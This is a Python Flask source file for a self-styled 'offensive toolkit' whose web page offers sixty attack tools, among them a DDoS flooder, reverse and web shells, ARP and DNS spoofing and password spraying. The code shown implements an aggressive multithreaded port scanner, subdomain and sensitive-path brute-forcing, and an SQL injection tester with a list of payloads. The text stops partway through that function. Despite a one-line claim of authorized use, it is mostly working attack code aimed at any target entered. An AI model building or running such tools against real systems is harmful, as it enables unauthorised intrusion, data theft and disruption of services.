"""
JAGUAR 45 CYBER KIT - OFFENSIVE EDITION
Real attack tools for authorized penetration testing
"""

import os
import sys
import json
import socket
import requests
import threading
import ipaddress
import time
import hashlib
import random
import string
import re
import ssl
import urllib3
import whois
import dns.resolver
import subprocess
import uuid
import base64
import hashlib
import hmac
from datetime import datetime, timedelta
from urllib.parse import urlparse, parse_qs, quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed
import mimetypes

# Flask imports
from flask import Flask, request, jsonify, render_template_string, Response
from flask_cors import CORS

# Disable warnings
import warnings
warnings.filterwarnings("ignore")
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)
CORS(app)

# ========== CONFIGURATION ==========
MAX_THREADS = 200
REQUEST_TIMEOUT = 3
USER_AGENT = "Jaguar45-Offensive/4.0"

# ========== HTML TEMPLATE WITH CATEGORIZED TOOLS ==========
HTML_TEMPLATE = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jaguar 45 - Offensive Toolkit</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Courier New', monospace;
        }
        
        body {
            background: #0a0a0a;
            color: #ff0000;
            min-height: 100vh;
            padding: 10px;
        }
        
        .header {
            text-align: center;
            padding: 10px 0;
            margin-bottom: 10px;
            border-bottom: 1px solid #ff0000;
        }
        
        .title {
            color: #ff0000;
            font-size: 18px;
            font-weight: bold;
        }
        
        .subtitle {
            color: #aa0000;
            font-size: 12px;
            margin-top: 3px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        .category-tabs {
            display: flex;
            flex-wrap: wrap;
            gap: 5px;
            margin-bottom: 10px;
            padding: 8px;
            background: #1a0000;
            border: 1px solid #330000;
            border-radius: 3px;
        }
        
        .category-tab {
            padding: 6px 12px;
            background: #220000;
            border: 1px solid #550000;
            color: #ff3333;
            cursor: pointer;
            font-size: 12px;
            border-radius: 2px;
            transition: all 0.2s;
        }
        
        .category-tab:hover {
            background: #330000;
            border-color: #ff0000;
        }
        
        .category-tab.active {
            background: #550000;
            border-color: #ff0000;
            box-shadow: 0 0 5px #ff0000;
        }
        
        .tools-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 8px;
            margin-bottom: 15px;
            padding: 10px;
            background: #110000;
            border: 1px solid #330000;
            border-radius: 3px;
            min-height: 200px;
        }
        
        .tool-btn {
            padding: 8px 12px;
            background: #220000;
            border: 1px solid #550000;
            color: #ff5555;
            cursor: pointer;
            font-size: 12px;
            border-radius: 2px;
            transition: all 0.2s;
            text-align: left;
        }
        
        .tool-btn:hover {
            background: #330000;
            border-color: #ff0000;
            transform: translateY(-1px);
        }
        
        .tool-btn.active {
            background: #550000;
            border-color: #ff0000;
            box-shadow: 0 0 5px #ff0000;
        }
        
        .input-area {
            background: #110000;
            border: 1px solid #330000;
            border-radius: 3px;
            padding: 10px;
            margin-bottom: 10px;
        }
        
        .input-row {
            display: flex;
            gap: 10px;
            margin-bottom: 8px;
            align-items: center;
        }
        
        .input-label {
            color: #ff5555;
            font-size: 13px;
            min-width: 150px;
        }
        
        .input-field {
            flex: 1;
            padding: 8px;
            background: #000;
            border: 1px solid #550000;
            color: #ff0000;
            font-size: 13px;
            border-radius: 2px;
        }
        
        .input-field:focus {
            outline: none;
            border-color: #ff0000;
            box-shadow: 0 0 5px #ff0000;
        }
        
        .button-row {
            display: flex;
            gap: 10px;
            margin-top: 10px;
        }
        
        .action-btn {
            padding: 8px 16px;
            border: none;
            border-radius: 2px;
            font-size: 13px;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .attack-btn {
            background: #330000;
            color: #ff0000;
            border: 1px solid #aa0000;
            font-weight: bold;
        }
        
        .attack-btn:hover {
            background: #440000;
            border-color: #ff0000;
            box-shadow: 0 0 8px #ff0000;
        }
        
        .stop-btn {
            background: #330000;
            color: #ff5555;
            border: 1px solid #550000;
        }
        
        .stop-btn:hover {
            background: #440000;
            border-color: #ff5555;
        }
        
        .clear-btn {
            background: #111111;
            color: #888888;
            border: 1px solid #333333;
        }
        
        .clear-btn:hover {
            background: #222222;
            border-color: #666666;
        }
        
        .results-area {
            background: #000;
            border: 1px solid #330000;
            border-radius: 3px;
            padding: 10px;
            margin-bottom: 10px;
            height: 500px;
            overflow-y: auto;
        }
        
        .results-header {
            color: #ff5555;
            font-size: 13px;
            margin-bottom: 10px;
            padding-bottom: 5px;
            border-bottom: 1px solid #330000;
        }
        
        .results-content {
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 13px;
            line-height: 1.4;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        
        .status-bar {
            display: flex;
            justify-content: space-between;
            padding: 8px;
            background: #110000;
            border: 1px solid #330000;
            border-radius: 3px;
            font-size: 12px;
            color: #aa0000;
        }
        
        /* Color Classes */
        .success { color: #00ff00; }
        .error { color: #ff0000; }
        .warning { color: #ffff00; }
        .info { color: #00ffff; }
        .highlight { color: #ff00ff; }
        .cyan { color: #00ffff; }
        .yellow { color: #ffff00; }
        .magenta { color: #ff00ff; }
        .blue { color: #0088ff; }
        .white { color: #ffffff; }
        .gray { color: #888888; }
        .red { color: #ff0000; }
        .green { color: #00ff00; }
        
        /* Terminal Output Styles */
        .output-line {
            margin-bottom: 2px;
            padding-left: 2px;
        }
        
        .progress-container {
            height: 4px;
            background: #110000;
            border-radius: 2px;
            margin-top: 8px;
            overflow: hidden;
        }
        
        .progress-bar {
            height: 100%;
            background: #ff0000;
            width: 0%;
            transition: width 0.3s;
        }
        
        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: #110000;
        }
        
        ::-webkit-scrollbar-thumb {
            background: #550000;
            border-radius: 4px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: #ff0000;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
            .tools-grid {
                grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
            }
            
            .input-row {
                flex-direction: column;
                align-items: flex-start;
            }
            
            .input-label {
                min-width: auto;
            }
            
            .results-area {
                height: 400px;
            }
            
            .category-tabs {
                justify-content: center;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="title">⚔️ JAGUAR 45 - OFFENSIVE CYBER TOOLS ⚔️</div>
            <div class="subtitle">Real Attack Tools • No Limitations • High Speed</div>
        </div>
        
        <div class="category-tabs">
            <button class="category-tab active" onclick="showCategory('recon')">🔍 Reconnaissance</button>
            <button class="category-tab" onclick="showCategory('vuln')">🎯 Vulnerability</button>
            <button class="category-tab" onclick="showCategory('attack')">⚡ Attack Tools</button>
            <button class="category-tab" onclick="showCategory('exploit')">💣 Exploitation</button>
            <button class="category-tab" onclick="showCategory('network')">🌐 Network</button>
            <button class="category-tab" onclick="showCategory('crypto')">🔐 Crypto</button>
        </div>
        
        <!-- Reconnaissance Tools -->
        <div class="tools-grid" id="recon-tools">
            <button class="tool-btn" onclick="selectTool(1)">1. Port Scanner</button>
            <button class="tool-btn" onclick="selectTool(2)">2. Subdomain Finder</button>
            <button class="tool-btn" onclick="selectTool(3)">3. Directory Scanner</button>
            <button class="tool-btn" onclick="selectTool(4)">4. DNS Records</button>
            <button class="tool-btn" onclick="selectTool(5)">5. WHOIS Lookup</button>
            <button class="tool-btn" onclick="selectTool(6)">6. SSL Checker</button>
            <button class="tool-btn" onclick="selectTool(7)">7. IP Geolocation</button>
            <button class="tool-btn" onclick="selectTool(8)">8. Website Info</button>
            <button class="tool-btn" onclick="selectTool(9)">9. CMS Detector</button>
            <button class="tool-btn" onclick="selectTool(10)">10. Headers Analyzer</button>
        </div>
        
        <!-- Vulnerability Tools -->
        <div class="tools-grid" id="vuln-tools" style="display: none;">
            <button class="tool-btn" onclick="selectTool(11)">11. SQL Injection</button>
            <button class="tool-btn" onclick="selectTool(12)">12. XSS Scanner</button>
            <button class="tool-btn" onclick="selectTool(13)">13. SSRF Tester</button>
            <button class="tool-btn" onclick="selectTool(14)">14. LFI/RFI Tester</button>
            <button class="tool-btn" onclick="selectTool(15)">15. Command Injection</button>
            <button class="tool-btn" onclick="selectTool(16)">16. XXE Tester</button>
            <button class="tool-btn" onclick="selectTool(17)">17. CSRF Tester</button>
            <button class="tool-btn" onclick="selectTool(18)">18. IDOR Scanner</button>
            <button class="tool-btn" onclick="selectTool(19)">19. Open Redirect</button>
            <button class="tool-btn" onclick="selectTool(20)">20. CORS Misconfig</button>
        </div>
        
        <!-- Attack Tools -->
        <div class="tools-grid" id="attack-tools" style="display: none;">
            <button class="tool-btn" onclick="selectTool(21)">21. DDoS Flooder</button>
            <button class="tool-btn" onclick="selectTool(22)">22. Bruteforce Attack</button>
            <button class="tool-btn" onclick="selectTool(23)">23. Password Spray</button>
            <button class="tool-btn" onclick="selectTool(24)">24. Session Hijack</button>
            <button class="tool-btn" onclick="selectTool(25)">25. JWT Attack</button>
            <button class="tool-btn" onclick="selectTool(26)">26. API Fuzzer</button>
            <button class="tool-btn" onclick="selectTool(27)">27. Upload Exploit</button>
            <button class="tool-btn" onclick="selectTool(28)">28. Wordpress Attack</button>
            <button class="tool-btn" onclick="selectTool(29)">29. Admin Panel Finder</button>
            <button class="tool-btn" onclick="selectTool(30)">30. Backup Finder</button>
        </div>
        
        <!-- Exploitation Tools -->
        <div class="tools-grid" id="exploit-tools" style="display: none;">
            <button class="tool-btn" onclick="selectTool(31)">31. Reverse Shell</button>
            <button class="tool-btn" onclick="selectTool(32)">32. Web Shell</button>
            <button class="tool-btn" onclick="selectTool(33)">33. File Inclusion</button>
            <button class="tool-btn" onclick="selectTool(34)">34. RCE Exploit</button>
            <button class="tool-btn" onclick="selectTool(35)">35. SSTI Tester</button>
            <button class="tool-btn" onclick="selectTool(36)">36. Deserialization</button>
            <button class="tool-btn" onclick="selectTool(37)">37. Buffer Overflow</button>
            <button class="tool-btn" onclick="selectTool(38)">38. Privilege Escalation</button>
            <button class="tool-btn" onclick="selectTool(39)">39. Metasploit Helper</button>
            <button class="tool-btn" onclick="selectTool(40)">40. Payload Generator</button>
        </div>
        
        <!-- Network Tools -->
        <div class="tools-grid" id="network-tools" style="display: none;">
            <button class="tool-btn" onclick="selectTool(41)">41. Network Scanner</button>
            <button class="tool-btn" onclick="selectTool(42)">42. ARP Spoofing</button>
            <button class="tool-btn" onclick="selectTool(43)">43. MAC Flood</button>
            <button class="tool-btn" onclick="selectTool(44)">44. DNS Spoofing</button>
            <button class="tool-btn" onclick="selectTool(45)">45. Port Knocking</button>
            <button class="tool-btn" onclick="selectTool(46)">46. Firewall Bypass</button>
            <button class="tool-btn" onclick="selectTool(47)">47. VPN Detection</button>
            <button class="tool-btn" onclick="selectTool(48)">48. Packet Sniffer</button>
            <button class="tool-btn" onclick="selectTool(49)">49. Traceroute</button>
            <button class="tool-btn" onclick="selectTool(50)">50. Ping Flood</button>
        </div>
        
        <!-- Crypto Tools -->
        <div class="tools-grid" id="crypto-tools" style="display: none;">
            <button class="tool-btn" onclick="selectTool(51)">51. Hash Cracker</button>
            <button class="tool-btn" onclick="selectTool(52)">52. Password Cracker</button>
            <button class="tool-btn" onclick="selectTool(53)">53. SSL Stripping</button>
            <button class="tool-btn" onclick="selectTool(54)">54. Certificate Attack</button>
            <button class="tool-btn" onclick="selectTool(55)">55. Encryption/Decryption</button>
            <button class="tool-btn" onclick="selectTool(56)">56. Steganography</button>
            <button class="tool-btn" onclick="selectTool(57)">57. RSA Attack</button>
            <button class="tool-btn" onclick="selectTool(58)">58. XOR Cracker</button>
            <button class="tool-btn" onclick="selectTool(59)">59. Base64 Attack</button>
            <button class="tool-btn" onclick="selectTool(60)">60. JWT Forger</button>
        </div>
        
        <div class="input-area">
            <div class="input-row">
                <div class="input-label" id="mainLabel">Target:</div>
                <input type="text" class="input-field" id="targetInput" 
                       placeholder="https://target.com or 192.168.1.1" autocomplete="off">
            </div>
            
            <div class="input-row" id="extraRow" style="display: none;">
                <div class="input-label" id="extraLabel">Options:</div>
                <input type="text" class="input-field" id="extraInput" 
                       placeholder="Additional parameters" autocomplete="off">
            </div>
            
            <div class="button-row">
                <button class="action-btn attack-btn" onclick="launchAttack()">⚡ LAUNCH ATTACK</button>
                <button class="action-btn stop-btn" onclick="stopAttack()">■ STOP</button>
                <button class="action-btn clear-btn" onclick="clearResults()">🗑 CLEAR</button>
            </div>
            
            <div class="progress-container">
                <div class="progress-bar" id="progressBar"></div>
            </div>
        </div>
        
        <div class="results-area">
            <div class="results-header" id="resultsHeader">
                Attack Results • Ready
            </div>
            <div class="results-content" id="resultsContent">
$ Offensive Toolkit v4.0 Initialized
$ 60 Real Attack Tools Loaded
$ Enter target and launch attack
                </div>
        </div>
        
        <div class="status-bar">
            <div id="statusText">STATUS: READY</div>
            <div id="toolName">TOOL: PORT SCANNER</div>
            <div id="timeDisplay">TIME: --:--:--</div>
        </div>
    </div>

    <script>
        let currentTool = 1;
        let attackActive = false;
        let attackStartTime = null;
        
        // Tool configurations
        const tools = {
            // Reconnaissance
            1: { name: 'Port Scanner', label: 'Target:', extra: true, extraLabel: 'Ports:', extraPlaceholder: '1-1000 or common' },
            2: { name: 'Subdomain Finder', label: 'Domain:', extra: false },
            3: { name: 'Directory Scanner', label: 'URL:', extra: false },
            4: { name: 'DNS Records', label: 'Domain:', extra: false },
            5: { name: 'WHOIS Lookup', label: 'Domain:', extra: false },
            6: { name: 'SSL Checker', label: 'Domain:', extra: false },
            7: { name: 'IP Geolocation', label: 'IP Address:', extra: false },
            8: { name: 'Website Info', label: 'URL:', extra: false },
            9: { name: 'CMS Detector', label: 'URL:', extra: false },
            10: { name: 'Headers Analyzer', label: 'URL:', extra: false },
            
            // Vulnerability
            11: { name: 'SQL Injection', label: 'Target URL:', extra: true, extraLabel: 'Parameter:', extraPlaceholder: 'id, user, etc' },
            12: { name: 'XSS Scanner', label: 'Target URL:', extra: false },
            13: { name: 'SSRF Tester', label: 'Target URL:', extra: true, extraLabel: 'Test URL:', extraPlaceholder: 'http://localhost' },
            14: { name: 'LFI/RFI Tester', label: 'Target URL:', extra: false },
            15: { name: 'Command Injection', label: 'Target URL:', extra: false },
            16: { name: 'XXE Tester', label: 'Target URL:', extra: false },
            17: { name: 'CSRF Tester', label: 'Target URL:', extra: false },
            18: { name: 'IDOR Scanner', label: 'Target URL:', extra: false },
            19: { name: 'Open Redirect', label: 'Target URL:', extra: false },
            20: { name: 'CORS Misconfig', label: 'Target URL:', extra: false },
            
            // Attack Tools
            21: { name: 'DDoS Flooder', label: 'Target URL:', extra: true, extraLabel: 'Duration (sec):', extraPlaceholder: '60' },
            22: { name: 'Bruteforce Attack', label: 'Login URL:', extra: true, extraLabel: 'Wordlist:', extraPlaceholder: 'passwords.txt or list' },
            23: { name: 'Password Spray', label: 'Login URL:', extra: true, extraLabel: 'Usernames:', extraPlaceholder: 'admin,user,test' },
            24: { name: 'Session Hijack', label: 'Target URL:', extra: true, extraLabel: 'Session ID:', extraPlaceholder: 'Optional' },
            25: { name: 'JWT Attack', label: 'JWT Token:', extra: true, extraLabel: 'Secret:', extraPlaceholder: 'Optional' },
            26: { name: 'API Fuzzer', label: 'API Endpoint:', extra: true, extraLabel: 'Parameters:', extraPlaceholder: 'id,name,page' },
            27: { name: 'Upload Exploit', label: 'Upload URL:', extra: true, extraLabel: 'File Type:', extraPlaceholder: 'php, asp, jsp' },
            28: { name: 'Wordpress Attack', label: 'Wordpress URL:', extra: false },
            29: { name: 'Admin Panel Finder', label: 'Target URL:', extra: false },
            30: { name: 'Backup Finder', label: 'Target URL:', extra: false },
            
            // Exploitation
            31: { name: 'Reverse Shell', label: 'Your IP:', extra: true, extraLabel: 'Port:', extraPlaceholder: '4444' },
            32: { name: 'Web Shell', label: 'Target URL:', extra: true, extraLabel: 'Shell Type:', extraPlaceholder: 'php, asp, jsp' },
            33: { name: 'File Inclusion', label: 'Target URL:', extra: true, extraLabel: 'File:', extraPlaceholder: '/etc/passwd' },
            34: { name: 'RCE Exploit', label: 'Target URL:', extra: true, extraLabel: 'Command:', extraPlaceholder: 'whoami, id, ls' },
            35: { name: 'SSTI Tester', label: 'Target URL:', extra: false },
            36: { name: 'Deserialization', label: 'Target URL:', extra: false },
            37: { name: 'Buffer Overflow', label: 'Target IP:', extra: true, extraLabel: 'Port:', extraPlaceholder: '21, 80, 445' },
            38: { name: 'Privilege Escalation', label: 'Target:', extra: true, extraLabel: 'OS:', extraPlaceholder: 'linux, windows' },
            39: { name: 'Metasploit Helper', label: 'Target IP:', extra: true, extraLabel: 'Port:', extraPlaceholder: 'Open port number' },
            40: { name: 'Payload Generator', label: 'Payload Type:', extra: true, extraLabel: 'Options:', extraPlaceholder: 'LHOST, LPORT' },
            
            // Network Tools
            41: { name: 'Network Scanner', label: 'Network CIDR:', extra: true, extraLabel: 'Ports:', extraPlaceholder: '22,80,443' },
            42: { name: 'ARP Spoofing', label: 'Target IP:', extra: true, extraLabel: 'Gateway IP:', extraPlaceholder: '192.168.1.1' },
            43: { name: 'MAC Flood', label: 'Target IP:', extra: true, extraLabel: 'Count:', extraPlaceholder: '1000' },
            44: { name: 'DNS Spoofing', label: 'Target Domain:', extra: true, extraLabel: 'Redirect IP:', extraPlaceholder: 'Your IP' },
            45: { name: 'Port Knocking', label: 'Target IP:', extra: true, extraLabel: 'Sequence:', extraPlaceholder: '1000,2000,3000' },
            46: { name: 'Firewall Bypass', label: 'Target URL:', extra: true, extraLabel: 'Method:', extraPlaceholder: 'X-Forwarded-For, etc' },
            47: { name: 'VPN Detection', label: 'Target IP:', extra: false },
            48: { name: 'Packet Sniffer', label: 'Interface:', extra: true, extraLabel: 'Filter:', extraPlaceholder: 'tcp, http, dns' },
            49: { name: 'Traceroute', label: 'Target Host:', extra: false },
            50: { name: 'Ping Flood', label: 'Target IP:', extra: true, extraLabel: 'Count:', extraPlaceholder: '1000' },
            
            // Crypto Tools
            51: { name: 'Hash Cracker', label: 'Hash:', extra: true, extraLabel: 'Type:', extraPlaceholder: 'md5, sha1, sha256' },
            52: { name: 'Password Cracker', label: 'Hash/Password:', extra: true, extraLabel: 'Wordlist:', extraPlaceholder: 'rockyou.txt' },
            53: { name: 'SSL Stripping', label: 'Target URL:', extra: false },
            54: { name: 'Certificate Attack', label: 'Domain:', extra: false },
            55: { name: 'Encryption/Decryption', label: 'Text:', extra: true, extraLabel: 'Key:', extraPlaceholder: 'Encryption key' },
            56: { name: 'Steganography', label: 'Image URL:', extra: true, extraLabel: 'Message:', extraPlaceholder: 'Hidden message' },
            57: { name: 'RSA Attack', label: 'Public Key:', extra: true, extraLabel: 'Ciphertext:', extraPlaceholder: 'Encrypted data' },
            58: { name: 'XOR Cracker', label: 'Encrypted Text:', extra: true, extraLabel: 'Key Length:', extraPlaceholder: '1-10' },
            59: { name: 'Base64 Attack', label: 'Base64 Text:', extra: false },
            60: { name: 'JWT Forger', label: 'JWT Token:', extra: true, extraLabel: 'New Claim:', extraPlaceholder: 'admin=true' }
        };
        
        function showCategory(category) {
            // Hide all tool grids
            document.querySelectorAll('.tools-grid').forEach(grid => {
                grid.style.display = 'none';
            });
            
            // Show selected category
            document.getElementById(category + '-tools').style.display = 'grid';
            
            // Update active tab
            document.querySelectorAll('.category-tab').forEach(tab => {
                tab.classList.remove('active');
            });
            event.target.classList.add('active');
            
            // Clear any selected tool
            document.querySelectorAll('.tool-btn').forEach(btn => {
                btn.classList.remove('active');
            });
        }
        
        function selectTool(toolId) {
            currentTool = toolId;
            const tool = tools[toolId];
            
            // Update UI
            document.getElementById('mainLabel').textContent = tool.label;
            document.getElementById('toolName').textContent = `TOOL: ${tool.name.toUpperCase()}`;
            document.getElementById('resultsHeader').textContent = `${tool.name} • Ready`;
            
            // Update extra input
            const extraRow = document.getElementById('extraRow');
            if (tool.extra) {
                extraRow.style.display = 'flex';
                document.getElementById('extraLabel').textContent = tool.extraLabel;
                document.getElementById('extraInput').placeholder = tool.extraPlaceholder;
            } else {
                extraRow.style.display = 'none';
            }
            
            // Update active button
            document.querySelectorAll('.tool-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            event.target.classList.add('active');
            
            // Clear results
            clearResults();
            addOutput(`$ Tool selected: ${tool.name}`, 'red');
            updateStatus('READY');
        }
        
        function launchAttack() {
            if (attackActive) return;
            
            const target = document.getElementById('targetInput').value.trim();
            if (!target) {
                addOutput('ERROR: Please enter a target', 'error');
                return;
            }
            
            const extra = document.getElementById('extraInput').value.trim();
            attackActive = true;
            attackStartTime = new Date();
            
            // Update UI
            updateStatus('ATTACKING...');
            document.getElementById('progressBar').style.width = '30%';
            addOutput(`$ Launching ${tools[currentTool].name}...`, 'red');
            addOutput(`$ Target: ${target}`, 'gray');
            if (extra) addOutput(`$ Options: ${extra}`, 'gray');
            addOutput('', 'white');
            
            // Prepare data
            const data = {
                tool: currentTool,
                target: target,
                extra: extra
            };
            
            // Launch attack
            fetch('/attack', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                attackActive = false;
                document.getElementById('progressBar').style.width = '100%';
                
                if (data.error) {
                    addOutput(`ERROR: ${data.error}`, 'error');
                    updateStatus('FAILED');
                } else {
                    displayResults(data.results);
                    updateStatus('COMPLETE');
                    
                    // Update time
                    const endTime = new Date();
                    const duration = ((endTime - attackStartTime) / 1000).toFixed(2);
                    addOutput(`$ Attack completed in ${duration}s`, 'success');
                }
                
                // Reset progress bar after delay
                setTimeout(() => {
                    document.getElementById('progressBar').style.width = '0%';
                }, 1000);
            })
            .catch(error => {
                attackActive = false;
                document.getElementById('progressBar').style.width = '0%';
                addOutput(`NETWORK ERROR: ${error}`, 'error');
                updateStatus('ERROR');
            });
        }
        
        function stopAttack() {
            if (!attackActive) return;
            
            attackActive = false;
            document.getElementById('progressBar').style.width = '0%';
            addOutput('$ Attack stopped by user', 'warning');
            updateStatus('STOPPED');
            
            // Send stop command to server
            fetch('/stop', { method: 'POST' });
        }
        
        function displayResults(results) {
            if (!results || results.length === 0) {
                addOutput('No results found', 'warning');
                return;
            }
            
            // Handle array of objects
            if (Array.isArray(results)) {
                results.forEach(item => {
                    if (typeof item === 'object') {
                        // Display object properties
                        for (const [key, value] of Object.entries(item)) {
                            if (value && typeof value === 'string') {
                                const color = getColorForKey(key, value);
                                addOutput(`${key.padEnd(20)}: ${value}`, color);
                            }
                        }
                        addOutput('', 'white'); // Empty line
                    } else {
                        // Plain string result
                        addOutput(item, 'white');
                    }
                });
            } 
            // Handle single object
            else if (typeof results === 'object') {
                for (const [key, value] of Object.entries(results)) {
                    if (value && typeof value === 'string') {
                        const color = getColorForKey(key, value);
                        addOutput(`${key.padEnd(20)}: ${value}`, color);
                    }
                }
            }
            // Handle plain text
            else {
                addOutput(results, 'white');
            }
        }
        
        function getColorForKey(key, value) {
            const keyLower = key.toLowerCase();
            const valueLower = value.toLowerCase();
            
            if (keyLower.includes('error') || valueLower.includes('error')) return 'error';
            if (keyLower.includes('success') || valueLower.includes('success')) return 'success';
            if (keyLower.includes('warning') || valueLower.includes('warning')) return 'warning';
            if (keyLower.includes('vulnerable') || valueLower.includes('vulnerable')) return 'error';
            if (keyLower.includes('exploit') || valueLower.includes('exploit')) return 'highlight';
            if (keyLower.includes('attack') || valueLower.includes('attack')) return 'red';
            if (keyLower.includes('open') || keyLower.includes('port')) return 'success';
            if (keyLower.includes('found') || keyLower.includes('detected')) return 'cyan';
            if (keyLower.includes('time') || keyLower.includes('duration')) return 'blue';
            
            return 'white';
        }
        
        function addOutput(text, colorClass = 'white') {
            const resultsDiv = document.getElementById('resultsContent');
            const line = document.createElement('div');
            line.className = `output-line ${colorClass}`;
            line.textContent = text;
            resultsDiv.appendChild(line);
            resultsDiv.scrollTop = resultsDiv.scrollHeight;
        }
        
        function clearResults() {
            document.getElementById('resultsContent').innerHTML = '';
            document.getElementById('progressBar').style.width = '0%';
            addOutput('$ Results cleared', 'gray');
            addOutput('$ System ready for attack', 'red');
            updateStatus('READY');
        }
        
        function updateStatus(text) {
            document.getElementById('statusText').textContent = `STATUS: ${text}`;
        }
        
        // Update time display
        function updateTime() {
            const now = new Date();
            const timeStr = now.toLocaleTimeString();
            document.getElementById('timeDisplay').textContent = `TIME: ${timeStr}`;
        }
        setInterval(updateTime, 1000);
        
        // Auto-select first tool on load
        window.onload = function() {
            selectTool(1);
            updateTime();
            
            // Add enter key support
            document.getElementById('targetInput').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') launchAttack();
            });
            document.getElementById('extraInput').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') launchAttack();
            });
            
            // Initial message
            addOutput('$ Jaguar 45 Offensive Toolkit v4.0', 'red');
            addOutput('$ 60 Real Attack Tools Loaded', 'cyan');
            addOutput('$ No HTTP/HTTPS Restrictions', 'yellow');
            addOutput('$ Enter target and launch attack', 'gray');
        };
    </script>
</body>
</html>'''

# ========== REAL OFFENSIVE TOOLS ==========

class OffensiveTools:
    def __init__(self):
        self.common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 
                            993, 995, 3306, 3389, 5432, 5900, 8080, 8443, 8888]
        self.common_subdomains = [
            "www", "mail", "ftp", "admin", "api", "dev", "test",
            "staging", "secure", "vpn", "portal", "blog", "shop",
            "webmail", "cpanel", "whm", "webdisk", "ns1", "ns2"
        ]
        self.attack_threads = {}
        
    # ========== RECONNAISSANCE ==========
    
    def port_scan(self, target, port_range="common"):
        """Fast port scanning with aggressive timing"""
        results = []
        open_ports = []
        
        try:
            ip = socket.gethostbyname(target.split(':')[0]) if ':' not in target else target
            
            if port_range == "common":
                ports = self.common_ports
            elif port_range == "top1000":
                ports = list(range(1, 1001))
            elif "-" in port_range:
                start, end = map(int, port_range.split("-"))
                ports = list(range(start, end + 1))
            else:
                ports = [int(p) for p in port_range.split(",") if p.isdigit()]
            
            results.append(f"Target:         {target}")
            results.append(f"IP:             {ip}")
            results.append(f"Ports:          {len(ports)}")
            results.append("="*50)
            
            def scan_port(port):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.2)  # Aggressive timeout
                    result = sock.connect_ex((ip, port))
                    sock.close()
                    if result == 0:
                        return port, True
                except:
                    pass
                return port, False
            
            with ThreadPoolExecutor(max_workers=500) as executor:
                futures = {executor.submit(scan_port, port): port for port in ports}
                for future in as_completed(futures):
                    port, is_open = future.result()
                    if is_open:
                        open_ports.append(port)
                        service = self.get_service(port)
                        results.append(f"PORT {port:<6} OPEN   {service}")
            
            results.append("="*50)
            results.append(f"Open Ports:     {len(open_ports)} found")
            if open_ports:
                results.append(f"List:           {sorted(open_ports)}")
            
            return results
            
        except Exception as e:
            return [f"ERROR: {str(e)}"]
    
    def subdomain_scan(self, domain):
        """Aggressive subdomain enumeration"""
        results = []
        found = []
        
        try:
            results.append(f"Domain:         {domain}")
            results.append(f"Testing {len(self.common_subdomains)} subdomains")
            results.append("="*50)
            
            def check_subdomain(sub):
                try:
                    test = f"{sub}.{domain}"
                    ip = socket.gethostbyname(test)
                    return sub, ip, True
                except:
                    return sub, None, False
            
            with ThreadPoolExecutor(max_workers=100) as executor:
                futures = [executor.submit(check_subdomain, sub) for sub in self.common_subdomains]
                for future in as_completed(futures):
                    sub, ip, found_flag = future.result()
                    if found_flag:
                        found.append(sub)
                        results.append(f"FOUND   {sub}.{domain:<20} [{ip}]")
            
            results.append("="*50)
            results.append(f"Found:          {len(found)} subdomains")
            
            return results
            
        except Exception as e:
            return [f"ERROR: {str(e)}"]
    
    def directory_scan(self, url):
        """Aggressive directory scanning"""
        results = []
        found = []
        
        try:
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
            
            paths = [
                "admin", "administrator", "login", "dashboard", "wp-admin",
                "wp-login.php", "admin.php", "config.php", ".env", ".git",
                "backup", "backup.zip", "backup.sql", "database.sql",
                "phpinfo.php", "test.php", "shell.php", "cmd.php",
                "cgi-bin", "server-status", "robots.txt", ".htaccess"
            ]
            
            results.append(f"Target:         {url}")
            results.append(f"Paths:          {len(paths)}")
            results.append("="*50)
            
            def check_path(path):
                try:
                    test_url = f"{url.rstrip('/')}/{path}"
                    response = requests.head(test_url, timeout=2, verify=False)
                    if response.status_code < 400:
                        return path, response.status_code, True
                except:
                    pass
                return path, 0, False
            
            with ThreadPoolExecutor(max_workers=100) as executor:
                futures = [executor.submit(check_path, p) for p in paths]
                for future in as_completed(futures):
                    path, status, found_flag = future.result()
                    if found_flag:
                        found.append(path)
                        results.append(f"FOUND   {path:<20} [{status}]")
            
            results.append("="*50)
            results.append(f"Found:          {len(found)} paths")
            
            return results
            
        except Exception as e:
            return [f"ERROR: {str(e)}"]
    
    # ========== VULNERABILITY SCANNING ==========
    
    def sql_injection(self, target, param="id"):
        """Real SQL injection testing with multiple payloads"""
        results = []
        
        try:
            if '?' not in target:
                target = f"{target}?{param}=1"
            
            results.append(f"Target:         {target}")
            results.append(f"Parameter:      {param}")
            results.append("="*50)
            
            payloads = [
                "'", "''", "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*",
                "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
                "' AND 1=1", "' AND 1=2", "1' AND SLEEP(5)--"
            ]
            
            vulnerable = False
            
            for payload in payloads:
                try:
                    test_url = target.replace(f"{param}=", f"{param}=1{payload}")
                    start = time.time()
                    response = requests.get(test_url, timeout=5, verify=False)
                    elapsed = time.time() - start
                    
                    # Check for SQL errors
                    if any(word in response.text.lower() for word in ['sql', 'mysql', 'syntax', 'error']):
                        vulnerable = True
